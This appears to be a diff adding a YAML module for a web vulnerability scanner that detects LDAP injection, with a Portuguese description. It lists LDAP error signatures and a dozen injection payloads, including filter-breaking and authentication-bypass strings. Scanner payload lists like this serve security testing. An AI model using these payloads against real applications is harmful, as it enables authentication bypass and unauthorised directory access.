@@ -1,0 +1,35 @@
+name: ldap
+description: LDAP Injection — quebra de filtro e erro de sintaxe LDAP
+detectors: [signature, diff]
+diff_len_ratio: 0.30
+
+transforms:
+  - raw
+  - url
+  - case_random
+
+signatures:
+  - "LDAPException"
+  - "javax\\.naming"
+  - "com\\.sun\\.jndi\\.ldap"
+  - "LDAP: error code \\d+"
+  - "Invalid DN syntax"
+  - "supplied argument is not a valid ldap"
+  - "InvalidSearchFilterException"
+  - "AcceptSecurityContext error"
+  - "OpenLDAP|slapd"
+  - "Bad search filter"
+
+payloads:
+  - { value: "*", tags: [wildcard] }
+  - { value: "*)(&", tags: [filter] }
+  - { value: "*))%00", tags: [filter, null] }
+  - { value: "*()|&'", tags: [error] }
+  - { value: "*)(uid=*))(|(uid=*", tags: [filter, bypass] }
+  - { value: "*)(objectClass=*", tags: [filter] }
+  - { value: "admin*", tags: [wildcard] }
+  - { value: "admin*)((|userpassword=*)", tags: [filter, auth] }
+  - { value: ")(cn=*)", tags: [filter] }
+  - { value: "*/*", tags: [error] }
+  - { value: "(|(mail=*))", tags: [filter] }
+  - { value: "\\28\\29", tags: [encoded] }
